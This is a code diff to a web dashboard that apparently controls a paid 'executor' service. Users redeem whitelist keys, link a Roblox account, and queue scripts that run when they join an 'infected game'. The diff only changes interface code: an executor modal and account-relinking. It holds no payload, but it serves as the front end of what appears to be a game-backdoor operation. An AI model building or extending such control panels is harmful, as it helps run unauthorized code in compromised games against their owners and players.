@@ -192,6 +192,7 @@ export default function DashboardPage() {
   const [robloxWebhookUrl, setRobloxWebhookUrl] = useState("")
   const [scriptInput, setScriptInput] = useState("")
   const [executorLoading, setExecutorLoading] = useState(false)
+  const [executorModal, setExecutorModal] = useState<{ show: boolean; status: "loading" | "success" | "error"; message: string }>({ show: false, status: "loading", message: "" })
   const [scriptLogs, setScriptLogs] = useState<ScriptLog[]>([])
   const [colorTheme, setColorTheme] = useState<string>("blue")
 
@@ -363,19 +364,19 @@ const fetchAdminData = useCallback(async () => {
   // Execute script
   const executeScript = async (scriptType?: "r6") => {
     if (!user) {
-      showToast("Please log in first", "error")
+      setExecutorModal({ show: true, status: "error", message: "Please log in first" })
       return
     }
     
     // Check plan first - show message if no plan
     if (userPlan === "none") {
-      showToast("You need an active plan to use the executor. Go to Whitelist to redeem a key.", "error")
+      setExecutorModal({ show: true, status: "error", message: "You need an active plan to use the executor. Go to Whitelist to redeem a key." })
       return
     }
     
     // Check roblox link
     if (!user.robloxUsername) {
-      showToast("You need to link your Roblox account first. Go to Whitelist.", "error")
+      setExecutorModal({ show: true, status: "error", message: "You need to link your Roblox account first. Go to Whitelist." })
       return
     }
 
@@ -385,11 +386,14 @@ const fetchAdminData = useCallback(async () => {
     }
     
     if (!script) {
-      showToast("Please enter a script", "error")
+      setExecutorModal({ show: true, status: "error", message: "Please enter a script" })
       return
     }
 
+    // Show loading modal
+    setExecutorModal({ show: true, status: "loading", message: "Queuing script for execution..." })
     setExecutorLoading(true)
+    
     try {
       const res = await fetch("/api/executor", {
         method: "POST",
@@ -401,13 +405,13 @@ const fetchAdminData = useCallback(async () => {
       })
       const data = await res.json()
       if (data.success) {
-        showToast("Script queued! Will execute when you're found in a game.", "success")
+        setExecutorModal({ show: true, status: "success", message: `Script queued successfully! It will execute when "${user.robloxUsername}" is detected in an infected game.` })
         if (!scriptType) setScriptInput("")
       } else {
-        showToast(data.error || "Failed to queue script", "error")
+        setExecutorModal({ show: true, status: "error", message: data.error || "Failed to queue script" })
       }
     } catch {
-      showToast("Something went wrong", "error")
+      setExecutorModal({ show: true, status: "error", message: "Something went wrong. Please try again." })
     }
     setExecutorLoading(false)
   }
@@ -1751,26 +1755,27 @@ const sidebarItems = [
                     <h3 className="font-semibold text-foreground">Link Roblox Account</h3>
                   </div>
                   
-                  {user.robloxUsername ? (
-                    <p className="text-sm text-green-500">Linked to: {user.robloxUsername}</p>
-                  ) : (
-                    <div className="space-y-3">
-                      <input
-                        type="text"
-                        value={robloxInput}
-                        onChange={(e) => setRobloxInput(e.target.value)}
-                        placeholder="Enter your Roblox username"
-                        className="w-full px-4 py-3 rounded-lg bg-secondary border border-border/30 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/50"
-                      />
-                      <button
-                        onClick={handleLinkRoblox}
-                        disabled={whitelistLoading || !robloxInput.trim()}
-                        className="w-full py-3 rounded-lg bg-primary text-primary-foreground font-semibold hover:bg-primary/90 transition-all disabled:opacity-50"
-                      >
-                        {whitelistLoading ? <Loader2 className="h-5 w-5 animate-spin mx-auto" /> : "Link Account"}
-                      </button>
-                    </div>
-                  )}
+                  <div className="space-y-3">
+                    {user.robloxUsername && (
+                      <div className="flex items-center justify-between p-3 rounded-lg bg-green-500/10 border border-green-500/30">
+                        <span className="text-sm text-green-500">Currently linked to: <strong>{user.robloxUsername}</strong></span>
+                      </div>
+                    )}
+                    <input
+                      type="text"
+                      value={robloxInput}
+                      onChange={(e) => setRobloxInput(e.target.value)}
+                      placeholder={user.robloxUsername ? "Enter new Roblox username" : "Enter your Roblox username"}
+                      className="w-full px-4 py-3 rounded-lg bg-secondary border border-border/30 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/50"
+                    />
+                    <button
+                      onClick={handleLinkRoblox}
+                      disabled={whitelistLoading || !robloxInput.trim()}
+                      className="w-full py-3 rounded-lg bg-primary text-primary-foreground font-semibold hover:bg-primary/90 transition-all disabled:opacity-50"
+                    >
+                      {whitelistLoading ? <Loader2 className="h-5 w-5 animate-spin mx-auto" /> : user.robloxUsername ? "Change Roblox Account" : "Link Account"}
+                    </button>
+                  </div>
                 </div>
               )}
 
@@ -2777,6 +2782,55 @@ print("[Moon] Executor loaded!")`, "executor-script")}
           )}
         </div>
       </main>
+
+      {/* Executor Modal */}
+      {executorModal.show && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm animate-fade-in">
+          <div className="glass rounded-2xl border border-border/50 p-8 max-w-md w-full mx-4 animate-scale-in">
+            <div className="text-center">
+              {executorModal.status === "loading" && (
+                <>
+                  <div className="h-16 w-16 rounded-full bg-primary/20 flex items-center justify-center mx-auto mb-4">
+                    <Loader2 className="h-8 w-8 text-primary animate-spin" />
+                  </div>
+                  <h3 className="text-xl font-bold text-foreground mb-2">Executing Script</h3>
+                  <p className="text-muted-foreground">{executorModal.message}</p>
+                </>
+              )}
+              {executorModal.status === "success" && (
+                <>
+                  <div className="h-16 w-16 rounded-full bg-green-500/20 flex items-center justify-center mx-auto mb-4">
+                    <Check className="h-8 w-8 text-green-500" />
+                  </div>
+                  <h3 className="text-xl font-bold text-foreground mb-2">Script Queued!</h3>
+                  <p className="text-muted-foreground">{executorModal.message}</p>
+                  <button
+                    onClick={() => setExecutorModal({ ...executorModal, show: false })}
+                    className="mt-6 px-8 py-3 rounded-lg bg-green-500 text-white font-semibold hover:bg-green-600 transition-all"
+                  >
+                    Done
+                  </button>
+                </>
+              )}
+              {executorModal.status === "error" && (
+                <>
+                  <div className="h-16 w-16 rounded-full bg-destructive/20 flex items-center justify-center mx-auto mb-4">
+                    <X className="h-8 w-8 text-destructive" />
+                  </div>
+                  <h3 className="text-xl font-bold text-foreground mb-2">Error</h3>
+                  <p className="text-muted-foreground">{executorModal.message}</p>
+                  <button
+                    onClick={() => setExecutorModal({ ...executorModal, show: false })}
+                    className="mt-6 px-8 py-3 rounded-lg bg-destructive text-white font-semibold hover:bg-destructive/90 transition-all"
+                  >
+                    Close
+                  </button>
+                </>
+              )}
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   )
 }
